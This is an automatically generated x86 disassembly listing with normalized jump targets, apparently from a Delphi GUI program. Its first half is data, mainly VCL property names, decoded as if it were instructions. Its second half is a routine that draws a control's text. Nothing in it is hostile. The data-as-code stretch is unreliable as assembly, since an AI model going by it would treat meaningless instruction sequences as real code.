nop
inc ecx
outsb
add [ edi ] al
lodsb [ esi ]
push esi
inc esp
add al dl
add al [ eax ]
call eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0x1
ja r-xdata
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
jb r-xdata
outsd
outsd
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
jne r-xdata
jb r-xdata
outsb
jae r-xdata
inc ebx
jb r-xdata
jb r-xdata
add [ ebx ] bl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ecx ] cl
inc edx
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
arpl [ eax + 0x6f ] bp
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
cwde
jno r-xdata
outsb
jae r-xdata
jl r-xdata
les edi [ edx + 0x48 ]
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001e ] al
je r-xdata
insb
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax + 0x4208001a ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
inc edx
inc edi
add [ edx + eax ] bh
call esp
add al [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or eax [ edx + 0x6f ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
test al 0x1
add bh bh
push esp
ja r-xdata
add [ eax ] al
sbb [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040026 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
hlt
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
insb
int3
add [ eax ] al
add [ eax ] eax
add dh bh
xchg esp eax
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
add [ edx ] cl
inc edx
jbe r-xdata
add al [ eax ]
inc [ eax ]
inc [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] eax
push cs
dec ecx
outsb
je r-xdata
lea ecx [ eax ]
les eax [ ecx ]
add bh bh
les eax [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
daa
add [ edi ] al
dec ecx
insd
dec ebp
outsd
fmul [ gs : ebp + 0x1c80048 ]
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jb r-xdata
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add [ edx + eax ] dl
add [ eax ] al
jb r-xdata
jae r-xdata
add [ 0x78450e00 ] ah
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax ] eax
push ebx
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
or ecx [ ebp + 0x75 ]
insb
add [ eax ] al
add [ eax + eax ] ch
insb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44566c74
add [ edi + edi * 8 ] ah
inc ebp
add [ eax - 0x1 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a002a ] al
je r-xdata
je r-xdata
add bh bh
in al dx
inc [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x78450e00
jb r-xdata
pop es
dec ecx
insd
dec esi
popad
insd
sbb [ gs : esi + 0x44 ] dl
add [ ecx + 0xff0002 ] dl
outsb
push ebx
insb
arpl [ gs : esp + eax * 8 - 0x47 ] si
inc esi
add [ eax + eax ] ah
jmp [ eax + 0x48 ]
dec eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
adc al 0x50
outsb
je r-xdata
sub eax 0x61500e00
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x42223c74
add [ eax + 0x2 ] dh
add bh bh
adc al 0x3
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905002b ] al
je r-xdata
add [ eax ] 0x0
add [ eax + 0x440e0020 ] al
outsd
jne r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080035 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add [ ebx ] cl
push eax
popad
jb r-xdata
add [ eax ] al
add [ edi ] ch
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ edx ] bl
add bh bh
je r-xdata
add [ eax ] al
insd
jae r-xdata
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
add [ esi ] al
push ebx
outsd
jb r-xdata
push esi
inc esp
add [ edx - 0x4700fffe ] dl
add [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ss : esi ] al
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
xor al 0x0
or edx [ ebx + 0x63 ]
jb r-xdata
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
dec ecx
add [ ebx + ebp * 2 ] ch
jo r-xdata
xor al [ eax ]
push cs
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ cs : ebx ] cl
push eax
popad
jb r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
loopne r-xdata
outsb
je r-xdata
add [ ebx ] cl
dec ebp
jne r-xdata
sub al 0x0
push esi
inc esp
add [ eax + 0x2 ] ah
add bh bh
or [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
add [ eax ] bl
clc
jpe r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + 0x48e0 ] cl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov [ eax ] eax
add bh bh
shl al 0x48
pop ds
inc esi
add [ eax + eax ] bh
push esi
inc esp
add al ah
add [ eax ] eax
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
insb
insb
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
add [ eax ] al
xor [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
jb r-xdata
add [ eax + edx * 2 ] dl
outsd
insb
outsd
jb r-xdata
je r-xdata
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf0656c62
adc al 0x42
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
add bh bh
mov bh bh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] al
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
push [ eax + 0x180048de ]
push esi
inc esp
add [ edx + eax - 0x770100 ] dl
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
push esi
inc esp
add [ edx + edx ] al
add [ eax ] 0x0
jb r-xdata
add [ eax ] al
das
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ edi + ecx * 2 ] cl
outsb
inc esp
popad
je r-xdata
js r-xdata
inc esi
add [ eax ] ah
adc al [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x50090033 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0041 ] al
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + esi * 8 + 0x14 ] si
inc edx
add [ eax ] bl
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090044 ] al
dec edi
jbe r-xdata
add [ eax - 0x80000000 ] al
inc ebx
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003f ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
mov [ edx + 0x1080048 ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ecx ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ebp ] 0xb8
add al [ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0042 ] al
outsb
inc esp
jb r-xdata
dec ebx
inc ebp
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090043 ] al
or [ eax ] 0xff0000e0
loopne r-xdata
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004c ] al
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
sbb [ eax + 0x1280048 ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
sbb al 0x81
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
dec ebx
jns r-xdata
add [ eax ] al
ja r-xdata
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ edx ] cl
dec edi
jae r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060046 ] al
outsb
inc ebp
js r-xdata
dec ebx
inc ebp
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d004a ] al
outsb
dec ebp
popad
jae r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec eax
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
jns r-xdata
jb r-xdata
popad
je r-xdata
adc [ edx ] 0xb
dec ebp
jns r-xdata
je r-xdata
jne r-xdata
jb r-xdata
outsb
push ebx
je r-xdata
outsd
arpl [ ebx + 0x40 ] bp
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
dec esp
popad
jbe r-xdata
dec esi
add [ edi + ecx * 2 ] cl
cmp al 0x7f
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add [ eax + 0x4f070045 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
outsb
inc ebp
outsb
je r-xdata
insd
mov [ edx + 0xf80048 ] al
add bh bh
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
inc esp
add [ esp + eax * 4 + 0x44 ] ch
jb r-xdata
dec edi
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090050 ] al
or [ eax ] 0x10
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090047 ] al
outsb
jae r-xdata
inc ebp
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
dec ecx
je r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004f ] al
outsb
dec ebp
outsd
jne r-xdata
cmp al 0x7f
rol [ eax + 0x2200048 ] 0x1
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ edi ] al
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4591 0x0
and al 0x0
inc edx
add [ esp + 0x64ec0042 ] cl
inc edx
add ah bh
inc edx
add ah ch
inc edx
add [ esp + edx * 2 ] cl
dec ebp
insd
outsd
push ebx
je r-xdata
pop edx
inc edx
add [ ecx + ebx * 2 - 0x4fbbffbe ] bh
inc ebp
add [ ebp + ebx * 2 + 0x42 ] bh
add ah dl
scasd [ edi ]
inc ebp
add [ ebp + ebx * 2 - 0x4d07ffbe ] al
inc ebp
add [ eax + esi * 4 + 0x63c80045 ] bl
inc edx
add [ ebp - 0x4cf3ffbe ] dh
inc ebp
add [ eax - 0x27ffba4e ] ch
push 0x58bc0042
inc edx
add al ah
pop eax
inc edx
add [ ecx + ebx * 2 ] al
inc edx
add [ edx + esi * 4 - 0x4defffbb ] bl
inc ebp
add [ eax - 0x77ffbda4 ] dl
pop ebp
inc edx
add [ edi + ebx * 2 + 0x42 ] dh
add [ eax ] al
pushad
inc edx
add ah dl
pushad
inc edx
add [ eax ] cl
mov cl 0x45
add [ eax ] cl
popad
inc edx
add [ eax ] bh
popad
inc edx
add [ eax - 0x17ffbdb2 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax + 0x4590 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 + 0x240045 ] ah
push ebp
retn 0x14c3
jo r-xdata
push ebp
outsb
dec ebp
outsd
jne r-xdata
adc [ eax ] 0x9
dec edi
jb r-xdata
add [ eax + 0x4f0c004d ] al
add [ eax ] al
add [ eax ] al
xor [ ecx ] ah
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
nop
inc ebp
add [ eax + eax ] ah
jb r-xdata
popad
outsd
jbe r-xdata
dec ebp
add [ eax ] al
add al 0x93
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
xchg edx eax
inc ebp
add [ eax + eax ] ah
add [ eax ] al
xor [ ecx ] ah
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
inc edx
add [ esp + 0x64ec0042 ] cl
inc edx
add ah bh
inc edx
add ah ch
inc edx
add [ eax - 0x49 ] ah
inc ebp
add [ eax ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffba49 ] bl
imul ebp [ esi + 0x67 ] 0x90909073
mov eax 0x7004590
or al 0x54
dec ebp
insd
outsd
push ebx
je r-xdata
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + ebx * 2 + 0x4e900042 ] cl
inc edx
add al ch
nop
jb r-xdata
outsb
push ebx
je r-xdata
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0051 ] al
outsb
dec ebp
outsd
dec ebp
add [ edi + ecx * 2 ] cl
outsb
adc al 0x42
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004e ] al
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
add [ eax + eax + 0x4c ] 0x84
inc esp
inc esp
add [ eax ] al
je r-xdata
dec esi
inc edx
add al ch
pop edx
inc edx
add [ ecx + ebx * 2 - 0x476bffbe ] bh
inc ebp
add [ ebp + ebx * 2 + 0x42 ] bh
nop
imul ebp [ esi + 0x67 ] 0x45901473
add [ edx ] bh
inc edx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + ebx * 2 + 0x4e900042 ] cl
imul ebp [ esi + 0x67 ] 0x90909073
loopne r-xdata
add al al
call 0xffffffffbc45d397
pop ecx
inc edx
add [ eax + edi * 4 + 0x5d7c0045 ] dl
inc edx
inc ebx
je r-xdata
add al ah
pop eax
inc edx
add [ ecx + ebx * 2 ] al
inc edx
add al dh
mov eax 0xb9600045
inc ebp
add [ eax - 0x77ffbda4 ] dl
pop ebp
inc edx
add [ eax + 0x45b9 ] al
pushad
inc edx
add ah dl
pushad
inc edx
add [ eax - 0x46 ] dl
inc ebp
add [ eax ] cl
popad
inc edx
add [ eax ] bh
popad
inc edx
add [ ecx + 0x61e80042 ] cl
inc edx
add ah dh
popad
inc edx
add al ch
bound eax [ edx ]
jl r-xdata
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov bh 0x45
add ah bl
mov bh 0x45
add ah bl
pop ebp
inc edx
add [ eax + 0x70004263 ] bl
mov eax 0x65b40045
inc edx
add [ esi ] bh
inc edx
add [ eax - 0x27ffba47 ] ah
push 0xb9d40042
inc ebp
insb
jae r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
je r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edx
add al ch
pop edx
inc edx
add [ ecx + ebx * 2 - 0xd37ffbe ] bh
inc ebp
nop
dec esi
imul ebp [ esi + 0x67 ] 0x45913473
add al ah
dec esp
inc ebp
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add [ ecx + 0x61e80042 ] cl
inc edx
add ah dh
popad
inc edx
add al ch
bound eax [ edx ]
jl r-xdata
add [ eax ] al
fmul [ ebx + 0x45 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
xchg ecx eax
inc ebp
add [ eax + eax ] ah
add [ ebp + ebx * 2 + 0x42 ] bh
add [ edx + esi * 8 - 0xc63ffbb ] ch
inc ebp
add ah bl
pop ebp
call 0xffffffffbc45d4c3
pop ecx
inc edx
add al cl
inc ebp
inc ebx
je r-xdata
inc edx
add [ eax ] dh
hlt
inc ebp
add [ ebx + esi * 8 + 0x5ddc0045 ] bl
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4593f8
push ebp
mov ebp esp
mov ecx 0x13
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4597e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x260 ]
mov edx [ ebx + 0x64 ]
mov eax edi
call sub_46e7e4
mov eax ebx
call sub_44cfd0
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_46e740
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x68 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_422fe4
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x48 ]
push eax
mov eax edi
call sub_46e8c8
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
lea edx [ ebp - 0x6c ]
mov eax ebx
call sub_48df68
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x70 ] eax
mov esi [ ebp - 0x70 ]
test esi esi
je r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_46df1c
inc [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_46df1c
lea edx [ ebp - 0x38 ]
mov eax edi
call sub_46e33c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x38 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_46df1c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov eax [ ebp - 0x24 ]
push eax
call GetTextExtentPoint32W
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x1c ]
xor edx edx
xor eax eax
call sub_422fe4
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
jne r-xdata
sub esi 0x4
mov esi [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4597e9
lea eax [ ebp - 0x9c ]
mov edx 0x3
call j_sub_44936c
lea eax [ ebp - 0x80 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x78 ]
call sub_4499d8
lea eax [ ebp - 0x74 ]
call j_sub_449348
lea eax [ ebp - 0x6c ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_44936c
retn
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
jne r-xdata
lea edx [ ebp - 0x38 ]
mov eax edi
call sub_46e33c
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x80 ] 0x0
je r-xdata
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
lea edx [ ebp - 0x94 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x94 ]
mov eax [ ebx + 0x260 ]
call sub_46e724
push eax
mov eax [ ebp - 0x30 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_422fe4
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_422fe4
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x44 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x400
push eax
lea eax [ ebp - 0x38 ]
push eax
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
mov eax [ ebp - 0x28 ]
push eax
call DrawTextW
mov edx [ ebx + 0x6c ]
mov eax [ edi + 0x14 ]
call sub_46df1c
mov eax edi
call sub_46e8c8
mov esi eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48df68
lea edx [ ebp - 0x9c ]
mov eax ebx
call sub_48df68
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x70 ] eax
mov ebx [ ebp - 0x70 ]
test ebx ebx
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx 0x20
mov eax ebx
call sub_490a7c
mov [ ebp - 0x14 ] eax
mov eax edi
call sub_46e8c8
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48df68
lea edx [ ebp - 0x98 ]
mov eax ebx
call sub_48df68
mov eax [ ebp - 0x98 ]
mov [ ebp - 0x70 ] eax
mov esi [ ebp - 0x70 ]
test esi esi
je r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x48 ]
push eax
mov eax edi
call sub_46e8c8
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
